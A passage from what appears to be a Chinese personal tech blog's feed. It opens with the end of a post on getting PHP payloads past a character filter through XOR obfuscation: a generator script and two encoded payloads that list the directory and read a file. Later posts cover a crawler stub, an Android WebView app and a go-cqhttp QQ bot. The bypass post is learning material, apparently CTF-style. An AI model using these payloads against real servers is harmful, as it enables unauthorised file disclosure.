class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>    rtable<span class="token punctuation">[</span>tempkey<span class="token punctuation">]</span> <span class="token operator">=</span> tempvalue<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    temp1 <span class="token operator">=</span> <span class="token string">''</span>    temp2 <span class="token operator">=</span> <span class="token string">''</span>    temp3 <span class="token operator">=</span> <span class="token string">''</span>    temp4 <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">:</span>        temp0 <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> temp0 <span class="token keyword">in</span> rtable<span class="token punctuation">:</span>            temp1 <span class="token operator">+=</span> rtable<span class="token punctuation">[</span>temp0<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>            temp2 <span class="token operator">+=</span> rtable<span class="token punctuation">[</span>temp0<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>            temp3 <span class="token operator">+=</span> rtable<span class="token punctuation">[</span>temp0<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>            temp4 <span class="token operator">+=</span> <span class="token string">'%ff'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp1 <span class="token operator">+=</span> temp0            temp2 <span class="token operator">+=</span> <span class="token string">'%ff'</span>            temp3 <span class="token operator">+=</span> <span class="token string">'%ff'</span>            temp4 <span class="token operator">+=</span> <span class="token string">'%ff'</span>        payload <span class="token operator">=</span> <span class="token string">'('</span> <span class="token operator">+</span> temp1 <span class="token operator">+</span> <span class="token string">')^('</span> <span class="token operator">+</span> temp2 <span class="token operator">+</span> <span class="token string">')^('</span> <span class="token operator">+</span> temp3 <span class="token operator">+</span> <span class="token string">')^('</span> <span class="token operator">+</span> temp4 <span class="token operator">+</span> <span class="token string">')'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># payload1: print_r(scandir(.));</span><span class="token comment"># payload1: (print_r)((scandir)(.));</span><span class="token comment"># payload1: ((%8d%8d%91%91%8c%a0%8d)^(%9c%ff%9c%ff%9c%ff%ff)^(%9e%ff%9b%ff%9b%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%91%8d)^(%ff%ff%ff%ff%ff%9c%ff)^(%ff%ff%ff%ff%ff%9b%ff)^(%ff%ff%ff%ff%ff%ff%ff))((%d1)^(%ff)^(%ff)^(%ff)));</span><span class="token comment"># payload2: readfile(end(scandir(.)));</span><span class="token comment"># payload2: (readfile)((end)((scandir)(.)));</span><span class="token comment"># payload2: ((%9a%9a%9b%99%99%99%93%9a)^(%9b%ff%99%93%ff%93%ff%ff)^(%8c%ff%9c%91%ff%9c%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%91%99)^(%ff%ff%93)^(%ff%ff%91)^(%ff%ff%ff))(((%8c%9c%9b%91%99%99%9a)^(%ff%ff%99%ff%93%93%9b)^(%ff%ff%9c%ff%91%9c%8c)^(%ff%ff%ff%ff%ff%ff%ff))((%d1)^(%ff)^(%ff)^(%ff))));</span><span class="token triple-quoted-string string">'''上面的payload之所以多加了许多括号是因为要防止异或之后连在一起，反正加个括号也不多的样子'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bypass原理"><a href="#bypass原理" class="headerlink" title="bypass原理"></a>bypass原理</h2><p>上面的脚本的bypass的原理可以分成两个来说</p><h3 id="首先，异或绕过"><a href="#首先，异或绕过" class="headerlink" title="首先，异或绕过"></a>首先，异或绕过</h3><p>这个很简单，就是使用payload的十六进制与<code>0xff</code>进行异或<code>（并将结果的0x换为%）</code>，因为异或计算的性质，一个十六进制与<code>0xff``（这里的0xff实际上可以是任何的其他值应该）</code>进行两次异或之后等于原来的值。</p><h3 id="其次，字符限制绕过"><a href="#其次，字符限制绕过" class="headerlink" title="其次，字符限制绕过"></a>其次，字符限制绕过</h3><p>这个操作上是将payload的字符串里面的字符替换为本来字符串内还有的其他的字符串的值的异或，例如payload为<code>print_r(scandir(.));</code>时，有下面的等价关系<code>p == r^c^a, i == n^c^d, t == s^c^d</code>，就这样替换。</p><p>再从异或层面解释原理就是，一个字符的十六进制与<code>0xff</code>进行四次异或之后还是它本身，总之就是偶数次异或之后一定等于原来的字符。</p><h2 id="故可总结payload如下"><a href="#故可总结payload如下" class="headerlink" title="故可总结payload如下"></a>故可总结payload如下</h2><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload"># payload1: print_r(scandir(.));# payload1: (print_r)((scandir)(.));# payload1: ((%8d%8d%91%91%8c%a0%8d)^(%9c%ff%9c%ff%9c%ff%ff)^(%9e%ff%9b%ff%9b%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%91%8d)^(%ff%ff%ff%ff%ff%9c%ff)^(%ff%ff%ff%ff%ff%9b%ff)^(%ff%ff%ff%ff%ff%ff%ff))((%d1)^(%ff)^(%ff)^(%ff)));# payload2: readfile(end(scandir(.)));# payload2: (readfile)((end)((scandir)(.)));# payload2: ((%9a%9a%9b%99%99%99%93%9a)^(%9b%ff%99%93%ff%93%ff%ff)^(%8c%ff%9c%91%ff%9c%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%91%99)^(%ff%ff%93)^(%ff%ff%91)^(%ff%ff%ff))(((%8c%9c%9b%91%99%99%9a)^(%ff%ff%99%ff%93%93%9b)^(%ff%ff%9c%ff%91%9c%8c)^(%ff%ff%ff%ff%ff%ff%ff))((%d1)^(%ff)^(%ff)^(%ff))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个payload暴露出当前路径下的文件，第二个payload读当前路径下的最后一个文件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> php代码审计 </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫入门学习</title>
      <link href="2021/04/16/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/04/16/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="爬图片"><a href="#爬图片" class="headerlink" title="爬图片"></a>爬图片</h2><p>首先是王者官网地址为，<code>https://pvp.qq.com/web201605/wallpaper.shtml</code>，先抓包抓到一个json文件，然后分析这个json文件</p><p><img src="/2021/04/16/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20210416004725877.png" alt="image-20210416004725877"></p><p>还有对应的壁纸链接<a href="http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/137/137-bigskin-1.jpg">http://game.gtimg.cn/images/yxzj/img201606/skin/hero-info/137/137-bigskin-1.jpg</a></p><p>其中<code>137</code>和<code>1</code>的位置对应json文件中的参数，故有Python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就没什么好说的了，为了不给服务器造成过载，请不要拿别人的网站测试多线程，可以加上sleep减轻被爬网站的服务器负担。</p><p>//脚本先放放</p><h2 id="爬ctfd平台分数等信息"><a href="#爬ctfd平台分数等信息" class="headerlink" title="爬ctfd平台分数等信息"></a>爬ctfd平台分数等信息</h2><p>有关脚本不多说，现在先不整，咕咕，有空再说，众所周知我从来不咕咕。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python图像处理学习</title>
      <link href="2021/04/14/python%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/04/14/python%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="pycharm报错处理"><a href="#pycharm报错处理" class="headerlink" title="pycharm报错处理"></a>pycharm报错处理</h2><p>首先是个编码错误，这里修改下pycharm的默认编码为utf-8即可<img src="/2021/04/14/python%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%AD%A6%E4%B9%A0/image-20210414194109758.png" alt="pycharm改编码为utf-8"></p><h2 id="pillow库学习"><a href="#pillow库学习" class="headerlink" title="pillow库学习"></a>pillow库学习</h2><p>我把的代码几乎都有不少的注释，这个还没学完就先不贴出来了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pycharm </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓开发之制作一个自己的博客App</title>
      <link href="2021/04/14/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E4%B9%8B%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2App/"/>
      <url>2021/04/14/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E4%B9%8B%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2App/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="开发界面"><a href="#开发界面" class="headerlink" title="开发界面"></a>开发界面</h2><p><img src="/2021/04/14/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E4%B9%8B%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2App/image-20210414005425769.png" alt="这是几个更改的文件"></p><p>emmm，相对于空白的项目也没填多少，就多了个启动动画和将TextView换为webview，换了个应用图标。仅此而已。</p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>起先遇到了闪退的问题，原来是我的标签错了，所以运行的时候千万不要忘了看日志。</p><p>还有就是那个第一级页面跳入二级页面的时候从二级页面退出的时候又回到了一级页面，原来是一级页面忘记关闭(<code>finish();</code>)了，粗心大意不可取啊。</p><p>再就是webview文字大小的问题，可以双重调整，一是settextzoom这个，另一个是设置默认字体大小的。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 设置默认字体大小</span>webSettings<span class="token punctuation">.</span><span class="token function">setDefaultFontSize</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 字体大小，实质上是百分比</span>webSettings<span class="token punctuation">.</span><span class="token function">setTextZoom</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面是设置默认的字体大小（没试有没有起作用），反正下面的语句是起作用了。</p><h2 id="最终的实现效果"><a href="#最终的实现效果" class="headerlink" title="最终的实现效果"></a>最终的实现效果</h2><p><img src="/2021/04/14/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E4%B9%8B%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2App/image-20210414010745535.png" alt="实现效果"></p><h2 id="OVER"><a href="#OVER" class="headerlink" title="OVER"></a>OVER</h2><p>可能会做一个系列的安卓来学习，代码会传到github进行托管（现在还未上传，有空再传，没错我就是懒狗），因为我本身也在学安卓逆向，emmm，但是应该不会经常搞这个，因为毕竟是条web狗，web太卷了呜呜呜。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p><a href="https://download.csdn.net/download/zhangxiansheng12/16684237">传到csdn上了</a></p><h3 id="啊这，其实很简单的，还要5个积分有点羞愧"><a href="#啊这，其实很简单的，还要5个积分有点羞愧" class="headerlink" title="啊这，其实很简单的，还要5个积分有点羞愧"></a>啊这，其实很简单的，还要5个积分有点羞愧</h3><p>哪里有问题欢迎与我交流。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 新手 </tag>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用python写一个基于go-cqhttp的bot</title>
      <link href="2021/04/13/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Ego-cqhttp%E7%9A%84bot/"/>
      <url>2021/04/13/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Ego-cqhttp%E7%9A%84bot/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="现在还挺简单，就不多写了"><a href="#现在还挺简单，就不多写了" class="headerlink" title="现在还挺简单，就不多写了"></a>现在还挺简单，就不多写了</h2><h3 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h3><p>代码在github了，<a href="https://github.com/a16n/YuJianBot/tree/main">项目源码</a></p><h2 id="配置教程"><a href="#配置教程" class="headerlink" title="配置教程"></a>配置教程</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>centos服务器版本 : 8.0</p><p> python:环境版本 : 3.6.8</p><p>config.yaml文件配置:</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># go-cqhttp 默认配置文件</span><span class="token key atrule">account</span><span class="token punctuation">:</span> <span class="token comment"># 账号相关</span>  <span class="token key atrule">uin</span><span class="token punctuation">:</span> 你的账号 <span class="token comment"># QQ账号</span>  <span class="token key atrule">password</span><span class="token punctuation">:</span> <span class="token string">'你的密码'</span> <span class="token comment"># 密码为空时使用扫码登录</span>  <span class="token key atrule">encrypt</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token comment"># 是否开启密码加密</span>  <span class="token key atrule">status</span><span class="token punctuation">:</span> <span class="token number">5</span>      <span class="token comment"># 在线状态 请参考 https://github.com/Mrs4s/go-cqhttp/blob/dev/docs/config.md#在线状态</span>  <span class="token key atrule">relogin</span><span class="token punctuation">:</span> <span class="token comment"># 重连设置</span>    <span class="token key atrule">disabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">delay</span><span class="token punctuation">:</span> <span class="token number">3</span>      <span class="token comment"># 重连延迟, 单位秒</span>    <span class="token key atrule">interval</span><span class="token punctuation">:</span> <span class="token number">0</span>   <span class="token comment"># 重连间隔</span>    <span class="token key atrule">max-times</span><span class="token punctuation">:</span> <span class="token number">0</span>  <span class="token comment"># 最大重连次数, 0为无限制</span>  <span class="token comment"># 是否使用服务器下发的新地址进行重连</span>  <span class="token comment"># 注意, 此设置可能导致在海外服务器上连接情况更差</span>  <span class="token key atrule">use-sso-address</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">heartbeat</span><span class="token punctuation">:</span>  <span class="token key atrule">disabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 是否开启心跳事件上报</span>  <span class="token comment"># 心跳频率, 单位秒</span>  <span class="token comment"># -1 为关闭心跳</span>  <span class="token key atrule">interval</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token key atrule">message</span><span class="token punctuation">:</span>  <span class="token comment"># 上报数据类型</span>  <span class="token comment"># 可选: string,array</span>  <span class="token key atrule">post-format</span><span class="token punctuation">:</span> string  <span class="token comment"># 是否忽略无效的CQ码, 如果为假将原样发送</span>  <span class="token key atrule">ignore-invalid-cqcode</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token comment"># 是否强制分片发送消息</span>  <span class="token comment"># 分片发送将会带来更快的速度</span>  <span class="token comment"># 但是兼容性会有些问题</span>  <span class="token key atrule">force-fragment</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token comment"># 是否将url分片发送</span>  <span class="token key atrule">fix-url</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token comment"># 下载图片等请求网络代理</span>  <span class="token key atrule">proxy-rewrite</span><span class="token punctuation">:</span> <span class="token string">''</span>  <span class="token comment"># 是否上报自身消息</span>  <span class="token key atrule">report-self-message</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token comment"># 移除服务端的Reply附带的At</span>  <span class="token key atrule">remove-reply-at</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token comment"># 为Reply附加更多信息</span>  <span class="token key atrule">extra-reply-data</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">output</span><span class="token punctuation">:</span>  <span class="token comment"># 日志等级 trace,debug,info,warn,error</span>  <span class="token key atrule">log-level</span><span class="token punctuation">:</span> error  <span class="token comment"># 是否启用 DEBUG</span>  <span class="token key atrule">debug</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 开启调试模式</span><span class="token comment"># 默认中间件锚点</span><span class="token key atrule">default-middlewares</span><span class="token punctuation">:</span> <span class="token important">&amp;default</span>  <span class="token comment"># 访问密钥, 强烈推荐在公网的服务器设置</span>  <span class="token key atrule">access-token</span><span class="token punctuation">:</span> <span class="token string">''</span>  <span class="token comment"># 事件过滤器文件目录</span>  <span class="token key atrule">filter</span><span class="token punctuation">:</span> <span class="token string">'./'</span>  <span class="token comment"># API限速设置</span>  <span class="token comment"># 该设置为全局生效</span>  <span class="token comment"># 原 cqhttp 虽然启用了 rate_limit 后缀, 但是基本没插件适配</span>  <span class="token comment"># 目前该限速设置为令牌桶算法, 请参考:</span>  <span class="token comment"># https://baike.baidu.com/item/%E4%BB%A4%E7%89%8C%E6%A1%B6%E7%AE%97%E6%B3%95/6597000?fr=aladdin</span>  <span class="token key atrule">rate-limit</span><span class="token punctuation">:</span>    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 是否启用限速</span>    <span class="token key atrule">frequency</span><span class="token punctuation">:</span> <span class="token number">1</span>  <span class="token comment"># 令牌回复频率, 单位秒</span>    <span class="token key atrule">bucket</span><span class="token punctuation">:</span> <span class="token number">1</span>     <span class="token comment"># 令牌桶大小</span><span class="token key atrule">servers</span><span class="token punctuation">:</span>  <span class="token comment"># HTTP 通信设置</span>  <span class="token punctuation">-</span> <span class="token key atrule">http</span><span class="token punctuation">:</span>      <span class="token comment"># 是否关闭正向HTTP服务器</span>      <span class="token key atrule">disabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>      <span class="token comment"># 服务端监听地址</span>      <span class="token key atrule">host</span><span class="token punctuation">:</span> 127.0.0.1      <span class="token comment"># 服务端监听端口</span>      <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">5700</span>      <span class="token comment"># 反向HTTP超时时间, 单位秒</span>      <span class="token comment"># 最小值为5，小于5将会忽略本项设置</span>      <span class="token key atrule">timeout</span><span class="token punctuation">:</span> <span class="token number">5</span>      <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*default</span> <span class="token comment"># 引用默认中间件</span>      <span class="token comment"># 反向HTTP POST地址列表</span>      <span class="token key atrule">post</span><span class="token punctuation">:</span>      <span class="token comment">#- url: '' # 地址</span>      <span class="token comment">#  secret: ''           # 密钥</span>      <span class="token punctuation">-</span> <span class="token key atrule">url</span><span class="token punctuation">:</span> 127.0.0.1<span class="token punctuation">:</span><span class="token number">5701</span> <span class="token comment"># 地址</span>        <span class="token key atrule">secret</span><span class="token punctuation">:</span> <span class="token string">''</span>          <span class="token comment"># 密钥</span>  <span class="token comment"># 正向WS设置</span>  <span class="token punctuation">-</span> <span class="token key atrule">ws</span><span class="token punctuation">:</span>      <span class="token comment"># 是否禁用正向WS服务器</span>      <span class="token key atrule">disabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>      <span class="token comment"># 正向WS服务器监听地址</span>      <span class="token key atrule">host</span><span class="token punctuation">:</span> 127.0.0.1      <span class="token comment"># 正向WS服务器监听端口</span>      <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">6700</span>      <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*default</span> <span class="token comment"># 引用默认中间件</span>  <span class="token punctuation">-</span> <span class="token key atrule">ws-reverse</span><span class="token punctuation">:</span>      <span class="token comment"># 是否禁用当前反向WS服务</span>      <span class="token key atrule">disabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>      <span class="token comment"># 反向WS Universal 地址</span>      <span class="token comment"># 注意 设置了此项地址后下面两项将会被忽略</span>      <span class="token key atrule">universal</span><span class="token punctuation">:</span> ws<span class="token punctuation">:</span>//your_websocket_universal.server      <span class="token comment"># 反向WS API 地址</span>      <span class="token key atrule">api</span><span class="token punctuation">:</span> ws<span class="token punctuation">:</span>//your_websocket_api.server      <span class="token comment"># 反向WS Event 地址</span>      <span class="token key atrule">event</span><span class="token punctuation">:</span> ws<span class="token punctuation">:</span>//your_websocket_event.server      <span class="token comment"># 重连间隔 单位毫秒</span>      <span class="token key atrule">reconnect-interval</span><span class="token punctuation">:</span> <span class="token number">3000</span>      <span class="token key atrule">middlewares</span><span class="token punctuation">:</span>        <span class="token key atrule">&lt;&lt;</span><span class="token punctuation">:</span> <span class="token important">*default</span> <span class="token comment"># 引用默认中间件</span>  <span class="token comment"># 可添加更多</span>  <span class="token comment">#- ws-reverse:</span>  <span class="token comment">#- ws:</span>  <span class="token comment">#- http:</span><span class="token key atrule">database</span><span class="token punctuation">:</span> <span class="token comment"># 数据库相关设置</span>  <span class="token key atrule">leveldb</span><span class="token punctuation">:</span>    <span class="token comment"># 是否启用内置leveldb数据库</span>    <span class="token comment"># 启用将会增加10-20MB的内存占用和一定的磁盘空间</span>    <span class="token comment"># 关闭将无法使用 撤回 回复 get_msg 等上下文相关功能</span>    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>device.json文件可根据需要删除</p><p>5701是事件上报的端口（实质上就是向该端口POST了一条json数据），可使用python的socket来监听该端口获得事件信息，并对该POST请求作出响应。</p><p>获得qq信息之后，就可以使用go-cqhttp自己的api来进行事件响应了，加消息内容判断与对应响应就可以了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         connect</span><span class="token comment"># Description:  主要逻辑</span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2021/4/12</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">import</span> SendMsg<span class="token keyword">import</span> connect<span class="token keyword">import</span> talk<span class="token comment"># 主循环事件处理</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    all_message <span class="token operator">=</span> connect<span class="token punctuation">.</span>rev_msg<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> all_message <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token comment"># 管理员权限</span>    admin <span class="token operator">=</span> <span class="token number">0</span>    admingroup <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2994016494</span><span class="token punctuation">]</span>   <span class="token comment"># 在这里添加管理员组</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> admingroup<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'sender'</span> <span class="token keyword">in</span> all_message<span class="token punctuation">:</span>            <span class="token keyword">if</span> all_message<span class="token punctuation">[</span><span class="token string">'sender'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>                admin <span class="token operator">=</span> <span class="token number">1</span>    <span class="token comment"># 关键词触发信息处理</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        talk<span class="token punctuation">.</span>teach_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">,</span> admin<span class="token punctuation">)</span>        talk<span class="token punctuation">.</span>talk_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">)</span>        SendMsg<span class="token punctuation">.</span>common_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">,</span> admin<span class="token punctuation">)</span>  <span class="token comment"># 一般信息处理</span>        SendMsg<span class="token punctuation">.</span>api_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">)</span>     <span class="token comment"># api信息处理</span>    <span class="token keyword">except</span> KeyError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token comment"># 关键词部分结束</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写个死循环接收事件判断，主要的对消息的反应在异常处理里面</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>        talk<span class="token punctuation">.</span>teach_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">,</span> admin<span class="token punctuation">)</span>        talk<span class="token punctuation">.</span>talk_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">)</span>        SendMsg<span class="token punctuation">.</span>common_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">,</span> admin<span class="token punctuation">)</span>  <span class="token comment"># 一般信息处理</span>        SendMsg<span class="token punctuation">.</span>api_msg<span class="token punctuation">(</span>all_message<span class="token punctuation">)</span>     <span class="token comment"># api信息处理</span>    <span class="token keyword">except</span> KeyError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span 